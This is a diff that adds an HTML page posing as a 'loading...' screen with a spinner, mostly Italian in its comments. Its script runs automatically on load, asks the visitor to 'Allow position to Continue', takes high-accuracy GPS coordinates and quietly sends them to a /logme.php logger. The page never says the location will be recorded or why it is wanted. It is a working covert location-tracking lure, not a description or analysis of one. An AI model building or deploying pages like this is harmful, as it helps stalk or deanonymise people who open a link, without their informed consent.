@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Caricamento...</title>
+  <style>
+    html, body {
+      margin: 0;
+      height: 100%;
+      background: #0b0b0b;
+      color: #e6e6e6;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+    }
+    .wrap {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      height: 100%;
+      gap: 18px;
+      text-align: center;
+      padding: 24px;
+    }
+    .spinner {
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      border: 6px solid rgba(255,255,255,0.15);
+      border-top-color: #ff2a6d;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .label {
+      font-size: 1rem;
+      opacity: 0.85;
+      letter-spacing: 0.3px;
+    }
+    .hint {
+      font-size: 0.9rem;
+      color: #bdbdbd;
+      opacity: 0.8;
+    }
+    /* Optional: piccolo effetto pulse al testo */
+    .pulse { animation: pulse 1.8s ease-in-out infinite; }
+    @keyframes pulse {
+      0%,100% { opacity: 0.55; }
+      50% { opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrap" role="status" aria-live="polite">
+    <div class="spinner" aria-hidden="true"></div>
+    <div class="label pulse">loading...</div>
+    <div class="hint">Allow position to Continue</div>
+  </div>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+  <script>
+    // === Logica rimasta intatta ===
+    function sendLocation(lat, lon) {
+      $.get("/logme.php?coords=" + lat + "," + lon);
+    }
+
+    function getLocationDesktop() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(pos) {
+          sendLocation(pos.coords.latitude, pos.coords.longitude);
+        });
+      }
+    }
+
+    function getLocationMobile() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(pos) {
+            sendLocation(pos.coords.latitude, pos.coords.longitude);
+          },
+          function(err) {
+            console.warn("Geolocalizzazione fallita:", err.message);
+            alert("Impossibile rilevare la posizione. Assicurati di aver abilitato GPS e permessi di posizione sul browser.");
+          },
+          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+      } else {
+        console.warn("Geolocalizzazione non supportata");
+      }
+    }
+
+    function getLocation() {
+      if (/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)) {
+        getLocationMobile();
+      } else {
+        getLocationDesktop();
+      }
+    }
+
+    // Avvio automatico all'entrata
+    $(document).ready(function(){
+      getLocation();
+    });
+  </script>
+</body>
+</html>
+
